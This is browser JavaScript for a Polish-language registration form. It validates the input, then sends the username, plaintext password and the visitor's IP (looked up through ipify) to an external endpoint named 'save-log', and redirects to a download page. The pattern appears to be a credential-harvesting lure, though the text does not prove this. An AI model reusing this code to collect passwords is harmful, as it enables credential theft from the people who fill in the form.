const BACKEND_URL = 'https://social-tools.onrender.com/save-log';

document.getElementById('registrationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const messageDiv = document.getElementById('message');
    const loadingDiv = document.getElementById('loading');
    
    messageDiv.style.display = 'none';
    
    if (password !== confirmPassword) {
        showMessage('Hasła nie są identyczne!', 'error');
        return;
    }
    
    if (username.length < 3) {
        showMessage('Nazwa użytkownika musi mieć co najmniej 3 znaki!', 'error');
        return;
    }
    
    if (password.length < 6) {
        showMessage('Hasło musi mieć co najmniej 6 znaków!', 'error');
        return;
    }
    
    loadingDiv.style.display = 'block';
    
    try {
        let userIP = 'unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                userIP = ipData.ip;
            }
        } catch (ipError) {
            console.log('Nie udało się pobrać IP');
        }

        const response = await fetch(BACKEND_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                ip: userIP
            })
        });

        const result = await response.json();
        console.log('Odpowiedź:', result);

        loadingDiv.style.display = 'none';

        if (result.success) {
            showMessage('✅ ' + result.message, 'success');
            document.getElementById('registrationForm').reset();
            
            // Przekierowanie po 2 sekundach
            setTimeout(() => {
                window.location.href = 'download.html';
            }, 2000);
            
        } else {
            showMessage('❌ ' + result.message, 'error');
        }
        
    } catch (error) {
        console.error('Błąd:', error);
        loadingDiv.style.display = 'none';
        showMessage('🚫 Błąd połączenia z serwerem.', 'error');
    }
});

function showMessage(text, type) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
}

